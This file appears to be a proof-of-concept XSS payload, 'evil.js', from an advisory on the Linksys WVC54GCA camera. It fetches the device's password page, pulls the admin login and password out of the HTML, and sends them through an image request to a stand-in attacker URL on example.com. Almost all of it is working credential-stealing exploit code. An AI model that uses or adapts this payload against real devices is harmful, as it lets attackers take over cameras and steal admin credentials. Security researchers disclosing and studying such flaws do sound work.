// evil.js : malicious JS file, typically located on attacker&#039;s site
// payload description: steals Linksys WVC54GCA admin password via XSS
// tested on FF3 and IE7
// based on code from developer.apple.com
function loadXMLDoc(url) {
	req = false;
    	// branch for native XMLHttpRequest object
    	if(window.XMLHttpRequest &amp;&amp; !(window.ActiveXObject)) {
    		try {	
			req = new XMLHttpRequest();
        	} 
		catch(e) {
			req = false;
        	}
    	} 
    	// branch for IE/Windows ActiveX version	
	else if(window.ActiveXObject) {
       		try { 
        		req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
      		} 
		catch(e)  {
        		try {
          			req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
        		} 
			catch(e) {
          			req = false;
        		}
		}
    	}
	if(req) {
		req.onreadystatechange = processReqChange;
		req.open(&quot;GET&quot;, url, true);
		req.send(&quot;&quot;);
	}
}
// end of loadXMLDoc(url)

function processReqChange() {
   	// only if req shows &quot;loaded&quot;
    	if (req.readyState == 4) {
        	// only if &quot;OK&quot;
        	if (req.status == 200) { 
			var bits=req.responseText.split(/\&quot;/);	
			var gems=&quot;&quot;;
			// dirty credentials-scraping code
			for (i=0;i&lt;bits.length;++i) { 
                                if(bits[i]==&quot;adm&quot; &amp;&amp; bits[i+1]==&quot; value=&quot;) {      
                               		gems+=&quot;login=&quot;; 
					gems+=bits[i+2];
                                }
                                if(bits[i]==&quot;admpw&quot; &amp;&amp; bits[i+1]==&quot; value=&quot;) {      
                                       	gems+=&#039;&amp;password=&#039;; 
					gems+=bits[i+2];    
                                }
			}
			alert(gems); // this line is for demo purposes only and would be removed in a real attack
			c=new Image();
			c.src=&#039;http://www.example.com/x.php?&#039;+gems; // URL should point to data-theft script on attacker&#039;s site
        	} 
    	}
}

var url=&quot;/adm/file.cgi?next_file=pass_wd.htm&quot;;
loadXMLDoc(url);
